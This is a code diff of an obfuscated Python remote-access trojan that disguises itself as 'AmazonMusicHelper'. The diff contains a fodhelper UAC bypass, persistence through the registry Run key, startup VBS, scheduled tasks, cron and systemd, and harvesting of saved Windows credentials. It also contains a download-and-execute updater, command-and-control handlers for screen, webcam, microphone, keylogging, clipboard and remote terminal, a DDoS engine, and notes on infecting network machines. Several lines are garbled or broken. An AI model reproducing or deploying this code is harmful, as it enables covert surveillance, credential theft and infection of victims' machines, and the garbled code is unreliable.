-            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
-            os.chmod(save_path, 0o755)
-            subprocess.Popen(save_path, shell=True)
-        return True, f"Downloaded to {save_path}"
-    except Exception as e: return False, str(e)
-CFG = {"FR": None}
-def _flist(path=""):
-    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
-    if not path and sys.platform == _D("_s313"):
-        return {_D("_s314"): "Drives", "parent": None, "items": [
-            {_D("_s315"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
-            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
-    t = Path(path).resolve() if path else Path.home()
-    if not t.exists(): return {_D("_s316"): "Not found"}
-    if t.is_file(): return {_D("_s317"): "Not a dir"}
-    items = []
-    denied = False
+        r = subprocess.run([_D("_s289"), "/list"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            line = line.strip()
+            if _D("_s290") in line or "Target" in line:
+                target = line.split(":")[-1].strip() if ":" in line else line
+                creds[_D("_s291")].append({"target": target, "type": "domain" if "Domain" in r.stdout else "generic"})
+    except: pass
     try:
-        entries = list(t.iterdir())
-    except PermissionError:
-        denied = True
-        entries = []
-    except OSError:
-        denied = True
-        entries = []
-    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
-        try:
-            s = e.stat(); items.append({_D("_s318"): e.name, "path": str(e.resolve()),
-                _D("_s319"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
-                _D("_s320"): datetime.fromtimestamp(s.st_mtime).isoformat()})
-        except: items.append({_D("_s321"): e.name, "path": str(e.resolve()),
-            _D("_s322"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
-    parent = str(t.parent.resolve()) if t.parent != t else None
-    result = {_D("_s323"): str(t.resolve()), "parent": parent, "items": items}
-    if denied:
-        result[_D("_s324")] = "Partial listing - some entries may be hidden due to permissions"
-    return result
-def _fdel(path):
-    t = Path(path).resolve()
-    if not t.exists(): return False, _D("_s325")
+        r = subprocess.run([_D("_s292"), "/list:TERMSRV"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            if _D("_s293") in line or "Target" in line:
+                creds["rdp"].append(line.split(":")[-1].strip() if ":" in line else line.strip())
+    except: pass
     try:
-        if t.is_dir(): shutil.rmtree(t)
-        else: t.unlink()
-        return True, _D("_s326")
-    except Exception as e: return False, str(e)
-def _fmkdir(parent, name):
-    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
-    except Exception as e: return False, str(e)
-def _fread(path, offset=0, cs=1024*1024):
-    try:
-        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
-        return {_D("_s327"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
-    except Exception as e: return {_D("_s328"): str(e)}
-def _fwrite(path, b64, offset=0, mode="wb"):
-    try:
-        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
-        with open(path, mode) as f:
-            if offset: f.seek(offset)
-            f.write(base64.b64decode(b64))
-        return True, "ok"
-    except Exception as e: return False, str(e)
-def _check_for_update(server_url):
-    ""_D("_s329")""
-    try:
-        import urllib.request
-        check_url = server_url.rstrip("/") + _D("_s330")
-        r = urllib.request.urlopen(check_url, timeout=15)
-        data = json.loads(r.read().decode())
-        remote_ver = (data.get(_D("_s331")) or "").strip()
-        download_url = (data.get(_D("_s332")) or "").strip()
-        if not remote_ver or not download_url:
-            _l.info(_D("_s333"))
-            return None, None
-        if remote_ver != _VERSION:
-            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
-            return remote_ver, download_url
-        else:
-            _l.info(f"Client is up to date (v{_VERSION})")
-            return None, None
-    except Exception as e:
-        _l.warning(f"Update check failed: {e}")
-        return None, None
-def _download_and_install(download_url, new_version):
-    ""_D("_s334")""
-    try:
-        import urllib.request
-        pd = _pdir()
-        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
-        _l.info(f"Downloading update from {download_url}...")
-        urllib.request.urlretrieve(download_url, new_exe)
-        _l.info(f"Downloaded to {new_exe}")
-        current_exe = _exepath()
-        bat_path = os.path.join(os.environ.get(_D("_s335"), pd), "rasphere_update.bat")
-        with open(bat_path, "w") as f:
-            f.write(f)
-        _l.info(f"Update script written to {bat_path}")
-        if sys.platform == _D("_s337"):
-            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
-            _l.info(_D("_s338"))
-        else:
-            _l.error(_D("_s339"))
-            return False
-        return True
-    except Exception as e:
-        _l.error(f"Update download/install failed: {e}")
-        return False
-def _is_admin():
-    ""_D("_s340")""
-    try:
-        if sys.platform == _D("_s341"):
-            return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    except:
-        pass
-    try:
-        return os.getuid() == 0
-    except:
-        pass
-    return False
-def _fodhelper_uac_bypass(args):
-    if sys.platform != _D("_s342"):
-        _l.warning(_D("_s343"))
+        r = subprocess.run([_D("_s294"), "/listcreds:""Windows CredentialsScan network for Windows machines (port 445 open) that can be infected.
+    If subnets is provided (list of _D("_s303") strings), uses those instead of local discovery.Connect to a WiFi network, scan it, infect discovered machines.
+    Runs in a subprocess to survive C2 disconnect during WiFi switch.Silent UAC bypass using fodhelper.exe (Windows 10/11).
+    Creates registry keys, launches fodhelper, and exits current process.
+    The elevated instance will clean up and resume."""
+    if sys.platform != _D("_s484"):
+        _l.warning(_D("_s485"))
         return False
     try:
         import winreg as wr
     except ImportError:
-        _l.error(_D("_s344"))
+        _l.error(_D("_s486"))
         return False
     exe_path = _exepath()
     elevated_args = []
     i = 1
     while i < len(sys.argv):
         a = sys.argv[i]
-        if a in (_D("_s345"), "--no-elevate", "--uninstall", "--install"):
+        if a in (_D("_s487"), "--no-elevate", "--uninstall", "--install"):
             i += 1
             continue
-        if a in (_D("_s346"), "--secret", "--id", "--reconnect"):
+        if a in (_D("_s488"), "--secret", "--id", "--reconnect"):
             elevated_args.append(a)
             if i + 1 < len(sys.argv):
                 elevated_args.append(sys.argv[i + 1])
@@ -1711,29 +1709,29 @@ def _fodhelper_uac_bypass(args):
         else:
             elevated_args.append(a)
         i += 1
-    elevated_args.append(_D("_s347"))
+    elevated_args.append(_D("_s489"))
     cmd = subprocess.list2cmdline([exe_path] + elevated_args)
     _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
     try:
         reg_path = r"Software\Classes\ms-settings\Shell\open\command"
         try:
             key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
-            wr.DeleteValue(key, _D("_s348"))
+            wr.DeleteValue(key, _D("_s490"))
             wr.CloseKey(key)
         except:
             pass
         key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
         wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
-        wr.SetValueEx(key, _D("_s349"), 0, wr.REG_SZ, "")
+        wr.SetValueEx(key, _D("_s491"), 0, wr.REG_SZ, "")
         wr.CloseKey(key)
         try:
             settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
             wr.CloseKey(settings_key)
         except:
             pass
-        fodhelper_path = os.path.join(os.environ.get(_D("_s350"), "C:\\Windows"), "System32", "fodhelper.exe")
+        fodhelper_path = os.path.join(os.environ.get(_D("_s492"), "C:\\Windows"), "System32", "fodhelper.exe")
         subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
-        _l.info(_D("_s351"))
+        _l.info(_D("_s493"))
         time.sleep(0.5)
         os._exit(0)
     except Exception as e:
@@ -1744,14 +1742,14 @@ def _fodhelper_uac_bypass(args):
             pass
         return False
 def _cleanup_uac_registry():
-    ""_D("_s352")""
+    ""_D("_s494")""
     try:
         import winreg as wr
         reg_path = r"Software\Classes\ms-settings\Shell\open\command"
         try:
             key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
             try:
-                wr.DeleteValue(key, _D("_s353"))
+                wr.DeleteValue(key, _D("_s495"))
             except:
                 pass
             try:
@@ -1772,109 +1770,109 @@ def _cleanup_uac_registry():
                 wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
             except:
                 pass
-        _l.info(_D("_s354"))
+        _l.info(_D("_s496"))
     except Exception as e:
         _l.debug(f"UAC cleanup (non-critical): {e}")
 _keepalive_stop = threading.Event()
 def _keepalive_pinger(server_url):
-    ""_D("_s355")""
+    ""_D("_s497")""
     import urllib.request
-    health_url = server_url.rstrip("/") + _D("_s356")
+    health_url = server_url.rstrip("/") + _D("_s498")
     while not _keepalive_stop.is_set():
         _keepalive_stop.wait(_KEEPALIVE)
         if _keepalive_stop.is_set():
             break
         try:
             urllib.request.urlopen(health_url, timeout=10)
-            _l.debug(_D("_s357"))
+            _l.debug(_D("_s499"))
         except Exception as e:
             _l.debug(f"Keep-alive ping failed: {e}")
 def _exepath():
-    if getattr(sys, _D("_s358"), False): return sys.executable
+    if getattr(sys, _D("_s500"), False): return sys.executable
     return os.path.abspath(sys.argv[0])
 def _pdir():
-    if sys.platform == _D("_s359"):
-        b = os.environ.get(_D("_s360"), os.path.expanduser("~"))
-        p = os.path.join(b, _D("_s361"))
+    if sys.platform == _D("_s501"):
+        b = os.environ.get(_D("_s502"), os.path.expanduser("~"))
+        p = os.path.join(b, _D("_s503"))
     else:
-        p = os.path.expanduser(_D("_s362"))
+        p = os.path.expanduser(_D("_s504"))
     os.makedirs(p, exist_ok=True)
     return p
 def _ip(url, secret, rec, cid):
     ep = _exepath(); pd = _pdir()
-    dest = os.path.join(pd, _D("_s363") if sys.platform == "win32" else "amazonmusicd")
+    dest = os.path.join(pd, _D("_s505") if sys.platform == "win32" else "amazonmusicd")
     if ep != dest:
         try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
         except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
-    ca = [dest, _D("_s364"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
-    if cid: ca += [_D("_s365"), cid]
+    ca = [dest, _D("_s506"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
+    if cid: ca += [_D("_s507"), cid]
     cl = subprocess.list2cmdline(ca)
     ok = False
-    if sys.platform == _D("_s366"):
+    if sys.platform == _D("_s508"):
         try:
             import winreg
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k, _D("_s367"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
+            winreg.SetValueEx(k, _D("_s509"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
         except Exception as e: _l.warning(f"Reg fail: {e}")
         try:
-            sd = os.path.join(os.environ.get(_D("_s368"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
+            sd = os.path.join(os.environ.get(_D("_s510"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
             if os.path.exists(sd):
-                vp = os.path.join(sd, _D("_s369"))
+                vp = os.path.join(sd, _D("_s511"))
                 with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
-                _l.info(_D("_s370")); ok = True
+                _l.info(_D("_s512")); ok = True
         except Exception as e: _l.warning(f"VBS fail: {e}")
         try:
-            subprocess.run([_D("_s371"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            r = subprocess.run([_D("_s372"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            if r.returncode == 0: _l.info(_D("_s373")); ok = True
+            subprocess.run([_D("_s513"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            r = subprocess.run([_D("_s514"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            if r.returncode == 0: _l.info(_D("_s515")); ok = True
         except Exception as e: _l.warning(f"Task fail: {e}")
     else:
         try:
             cline = f"@reboot {cl} > /dev/null 2>&1 &"
-            ex = subprocess.run([_D("_s374"),"-l"], capture_output=True, text=True)
+            ex = subprocess.run([_D("_s516"),"-l"], capture_output=True, text=True)
             ct = (ex.stdout or "")
-            if _D("_s375") not in ct:
+            if _D("_s517") not in ct:
                 ct += f"\n
-                subprocess.run([_D("_s376"),"-"], input=ct, text=True)
-                _l.info(_D("_s377")); ok = True
+                subprocess.run([_D("_s518"),"-"], input=ct, text=True)
+                _l.info(_D("_s519")); ok = True
         except Exception as e: _l.warning(f"Cron fail: {e}")
         try:
-            sd = os.path.expanduser(_D("_s378")); os.makedirs(sd, exist_ok=True)
+            sd = os.path.expanduser(_D("_s520")); os.makedirs(sd, exist_ok=True)
             sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
-            with open(os.path.join(sd, _D("_s379")), "w") as f: f.write(sc)
-            subprocess.run([_D("_s380"),"--user","daemon-reload"], capture_output=True)
-            subprocess.run([_D("_s381"),"--user","enable","amazonmusic-helper"], capture_output=True)
-            _l.info(_D("_s382")); ok = True
+            with open(os.path.join(sd, _D("_s521")), "w") as f: f.write(sc)
+            subprocess.run([_D("_s522"),"--user","daemon-reload"], capture_output=True)
+            subprocess.run([_D("_s523"),"--user","enable","amazonmusic-helper"], capture_output=True)
+            _l.info(_D("_s524")); ok = True
         except Exception as e: _l.warning(f"systemd fail: {e}")
     return ok
 def _up():
     ok = False
-    if sys.platform == _D("_s383"):
+    if sys.platform == _D("_s525"):
         try:
             import winreg
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            try: winreg.DeleteValue(k, _D("_s384")); ok = True
+            try: winreg.DeleteValue(k, _D("_s526")); ok = True
             except FileNotFoundError: pass
             winreg.CloseKey(k)
         except: pass
         try:
-            vp = os.path.join(os.environ.get(_D("_s385"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
+            vp = os.path.join(os.environ.get(_D("_s527"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
             if os.path.exists(vp): os.remove(vp); ok = True
         except: pass
-        try: subprocess.run([_D("_s386"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
+        try: subprocess.run([_D("_s528"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
         except: pass
     else:
         try:
-            ex = subprocess.run([_D("_s387"),"-l"], capture_output=True, text=True)
-            if ex.stdout and _D("_s388") in ex.stdout:
-                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s389") not in l)
-                subprocess.run([_D("_s390"),"-"], input=nc, text=True); ok = True
+            ex = subprocess.run([_D("_s529"),"-l"], capture_output=True, text=True)
+            if ex.stdout and _D("_s530") in ex.stdout:
+                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s531") not in l)
+                subprocess.run([_D("_s532"),"-"], input=nc, text=True); ok = True
         except: pass
         try:
-            sp = os.path.expanduser(_D("_s391"))
+            sp = os.path.expanduser(_D("_s533"))
             if os.path.exists(sp):
-                subprocess.run([_D("_s392"),"--user","disable","amazonmusic-helper"], capture_output=True)
-                os.remove(sp); subprocess.run([_D("_s393"),"--user","daemon-reload"], capture_output=True); ok = True
+                subprocess.run([_D("_s534"),"--user","disable","amazonmusic-helper"], capture_output=True)
+                os.remove(sp); subprocess.run([_D("_s535"),"--user","daemon-reload"], capture_output=True); ok = True
         except: pass
     try:
         pd = _pdir()
@@ -1886,8 +1884,8 @@ def _up():
     except: pass
     return ok
 def _sh(sio):
-    sc = CapEngine(sio, _D("_s394"))
-    wc = CapEngine(sio, _D("_s395"))
+    sc = CapEngine(sio, _D("_s536"))
+    wc = CapEngine(sio, _D("_s537"))
     mic = MicEngine(sio)
     mon = SysMon(sio)
     term = Term(sio)
@@ -1895,211 +1893,286 @@ def _sh(sio):
     global ddos
     ddos = DdosEngine(sio)
     _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
-    @sio.on(_D("_s396"))
+    @sio.on(_D("_s538"))
     def _c():
-        _l.info(_D("_s397")); _s.conn = True
-        sio.emit(_D("_s398"), {"secret": _s.secret, "client_id": _s.cid,
-            _D("_s399"): {"hostname": socket.gethostname(), "platform": sys.platform,
-                _D("_s400"): os.environ.get("USERNAME", os.environ.get("USER","?")),
-                _D("_s401"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
-                    _D("_s402"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
-    @sio.on(_D("_s403"))
+        _l.info(_D("_s539")); _s.conn = True
+        sio.emit(_D("_s540"), {"secret": _s.secret, "client_id": _s.cid,
+            _D("_s541"): {"hostname": socket.gethostname(), "platform": sys.platform,
+                _D("_s542"): os.environ.get("USERNAME", os.environ.get("USER","?")),
+                _D("_s543"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
+                    _D("_s544"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
+    @sio.on(_D("_s545"))
     def _d():
         _block_input(False)  
-        _l.info(_D("_s404")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
-    @sio.on(_D("_s405"))
-    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s406"), _s.cid); _l.info(f"Registered: {_s.cid}")
-    @sio.on(_D("_s407"))
+        _l.info(_D("_s546")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
+    @sio.on(_D("_s547"))
+    def _r(d):
+        _s.reg = True; _s.cid = d.get(_D("_s548"), _s.cid); _l.info(f"Registered: {_s.cid}")
+        def _report_saved():
+            try:
+                save_dir = _pdir()
+                for fname in os.listdir(save_dir):
+                    if fname.startswith(_D("_s549")) and fname.endswith(".json"):
+                        try:
+                            with open(os.path.join(save_dir, fname), "r") as fp:
+                                data = json.load(fp)
+                            sio.emit(_D("_s550"), data)
+                            os.remove(os.path.join(save_dir, fname))
+                        except: pass
+            except: pass
+        threading.Thread(target=_report_saved, daemon=True).start()
+    @sio.on(_D("_s551"))
     def _sc(d=None):
-        if d and _D("_s408") in d: sc.monitor_idx = int(d.get("monitor", 1))
-        sc.start(); sio.emit(_D("_s409"), {"active": True})
-    @sio.on(_D("_s410"))
-    def _sc2(): sc.stop(); sio.emit(_D("_s411"), {"active": False})
-    @sio.on(_D("_s412"))
+        if d and _D("_s552") in d: sc.monitor_idx = int(d.get("monitor", 1))
+        sc.start(); sio.emit(_D("_s553"), {"active": True})
+    @sio.on(_D("_s554"))
+    def _sc2(): sc.stop(); sio.emit(_D("_s555"), {"active": False})
+    @sio.on(_D("_s556"))
     def _smn(d):
-        if d and _D("_s413") in d:
-            sc.monitor_idx = int(d[_D("_s414")])
+        if d and _D("_s557") in d:
+            sc.monitor_idx = int(d[_D("_s558")])
             was_running = sc.r
             if was_running:
                 sc.stop()
                 sc.start()
-                sio.emit(_D("_s415"), {"active": True})
-    @sio.on(_D("_s416"))
+                sio.emit(_D("_s559"), {"active": True})
+    @sio.on(_D("_s560"))
     def _sq(d):
         if d:
-            if _D("_s417") in d: sc.q = max(1, min(100, int(d["quality"])))
-            if _D("_s418") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
+            if _D("_s561") in d: sc.q = max(1, min(100, int(d["quality"])))
+            if _D("_s562") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
             if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
-    @sio.on(_D("_s419"))
-    def _wc(d=None): wc.start(); sio.emit(_D("_s420"), {"active": True})
-    @sio.on(_D("_s421"))
-    def _wc2(): wc.stop(); sio.emit(_D("_s422"), {"active": False})
-    @sio.on(_D("_s423"))
+    @sio.on(_D("_s563"))
+    def _wc(d=None): wc.start(); sio.emit(_D("_s564"), {"active": True})
+    @sio.on(_D("_s565"))
+    def _wc2(): wc.stop(); sio.emit(_D("_s566"), {"active": False})
+    @sio.on(_D("_s567"))
     def _wq(d):
         if d:
-            if _D("_s424") in d: wc.q = max(1, min(100, int(d["quality"])))
+            if _D("_s568") in d: wc.q = max(1, min(100, int(d["quality"])))
             if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
-    @sio.on(_D("_s425"))
+    @sio.on(_D("_s569"))
     def _mstart(d=None): mic.start()
-    @sio.on(_D("_s426"))
-    def _mstop(): mic.stop(); sio.emit(_D("_s427"), {"active": False})
-    @sio.on(_D("_s428"))
+    @sio.on(_D("_s570"))
+    def _mstop(): mic.stop(); sio.emit(_D("_s571"), {"active": False})
+    @sio.on(_D("_s572"))
     def _kstart(d=None): keylog.start()
-    @sio.on(_D("_s429"))
+    @sio.on(_D("_s573"))
     def _kstop(): keylog.stop()
-    @sio.on(_D("_s430"))
+    @sio.on(_D("_s574"))
     def _me(d):
-        if not HAS[_D("_s431")] or not _s.mc: return
+        if not HAS[_D("_s575")] or not _s.mc: return
         try:
-            a = d.get(_D("_s432"),"")
-            if a == _D("_s433"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
-            elif a == _D("_s434"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
-            elif a == _D("_s435"):
-                bm = {_D("_s436"): MB.left, "right": MB.right, "middle": MB.middle}
-                _s.mc.click(bm.get(d.get(_D("_s437"),"left").lower(), MB.left), 2 if d.get("double") else 1)
-            elif a == _D("_s438"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
-            elif a == _D("_s439"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
-            elif a == _D("_s440"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
+            a = d.get(_D("_s576"),"")
+            if a == _D("_s577"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
+            elif a == _D("_s578"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
+            elif a == _D("_s579"):
+                bm = {_D("_s580"): MB.left, "right": MB.right, "middle": MB.middle}
+                _s.mc.click(bm.get(d.get(_D("_s581"),"left").lower(), MB.left), 2 if d.get("double") else 1)
+            elif a == _D("_s582"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
+            elif a == _D("_s583"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
+            elif a == _D("_s584"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
         except Exception as e: _l.error(f"Mouse err: {e}")
-    @sio.on(_D("_s441"))
+    @sio.on(_D("_s585"))
     def _ke(d):
-        if not HAS[_D("_s442")] or not _s.kc: return
+        if not HAS[_D("_s586")] or not _s.kc: return
         try:
-            SP = {_D("_s443"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
-                  "tab": Key.tab, _D("_s444"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
-                  _D("_s445"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
-                  "up": Key.up, _D("_s446"): Key.down, "left": Key.left, "right": Key.right,
+            SP = {_D("_s587"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
+                  "tab": Key.tab, _D("_s588"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
+                  _D("_s589"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
+                  "up": Key.up, _D("_s590"): Key.down, "left": Key.left, "right": Key.right,
                   **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
             def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
-            a = d.get(_D("_s447"),"")
-            if a == _D("_s448"): _s.kc.press(rk(d.get("key","")))
-            elif a == _D("_s449"): _s.kc.release(rk(d.get("key","")))
-            elif a == _D("_s450"):
-                ks = [rk(k) for k in d.get(_D("_s451"),[])]
+            a = d.get(_D("_s591"),"")
+            if a == _D("_s592"): _s.kc.press(rk(d.get("key","")))
+            elif a == _D("_s593"): _s.kc.release(rk(d.get("key","")))
+            elif a == _D("_s594"):
+                ks = [rk(k) for k in d.get(_D("_s595"),[])]
                 for k in ks: _s.kc.press(k)
                 for k in reversed(ks): _s.kc.release(k)
-            elif a == _D("_s452"): _s.kc.type(d.get("text",""))
-            elif a == _D("_s453"):
-                scs = {_D("_s454"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
-                       _D("_s455"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
-                       _D("_s456"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
-                       _D("_s457"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
-                       _D("_s458"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
-                       _D("_s459"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
-                       _D("_s460"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
-                sc = scs.get(d.get(_D("_s461"),""))
+            elif a == _D("_s596"): _s.kc.type(d.get("text",""))
+            elif a == _D("_s597"):
+                scs = {_D("_s598"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
+                       _D("_s599"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
+                       _D("_s600"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
+                       _D("_s601"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
+                       _D("_s602"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
+                       _D("_s603"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
+                       _D("_s604"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
+                sc = scs.get(d.get(_D("_s605"),""))
                 if sc:
                     for m in sc[0]: _s.kc.press(m)
                     _s.kc.press(sc[1]); _s.kc.release(sc[1])
                     for m in reversed(sc[0]): _s.kc.release(m)
         except Exception as e: _l.error(f"Key err: {e}")
-    @sio.on(_D("_s462"))
-    def _ts(): ok = term.start(); sio.emit(_D("_s463"), {"active": ok})
-    @sio.on(_D("_s464"))
-    def _ti(d): term.write((d or {}).get(_D("_s465"),""))
-    @sio.on(_D("_s466"))
-    def _tst(): term.stop(); sio.emit(_D("_s467"), {"active": False})
-    @sio.on(_D("_s468"))
-    def _sm(): mon.start(); sio.emit(_D("_s469"), {"active": True})
-    @sio.on(_D("_s470"))
-    def _sm2(): mon.stop(); sio.emit(_D("_s471"), {"active": False})
-    @sio.on(_D("_s472"))
-    def _gp(): sio.emit(_D("_s473"), {"processes": _proc()})
-    @sio.on(_D("_s474"))
-    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s475"), {"ok": ok, "message": msg, "pid": pid})
-    @sio.on(_D("_s476"))
+    @sio.on(_D("_s606"))
+    def _ts(): ok = term.start(); sio.emit(_D("_s607"), {"active": ok})
+    @sio.on(_D("_s608"))
+    def _ti(d): term.write((d or {}).get(_D("_s609"),""))
+    @sio.on(_D("_s610"))
+    def _tst(): term.stop(); sio.emit(_D("_s611"), {"active": False})
+    @sio.on(_D("_s612"))
+    def _sm(): mon.start(); sio.emit(_D("_s613"), {"active": True})
+    @sio.on(_D("_s614"))
+    def _sm2(): mon.stop(); sio.emit(_D("_s615"), {"active": False})
+    @sio.on(_D("_s616"))
+    def _gp(): sio.emit(_D("_s617"), {"processes": _proc()})
+    @sio.on(_D("_s618"))
+    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s619"), {"ok": ok, "message": msg, "pid": pid})
+    @sio.on(_D("_s620"))
     def _cg():
-        if HAS[_D("_s477")]:
-            try: sio.emit(_D("_s478"), {"text": pyperclip.paste()})
-            except Exception as e: sio.emit(_D("_s479"), {"error": str(e)})
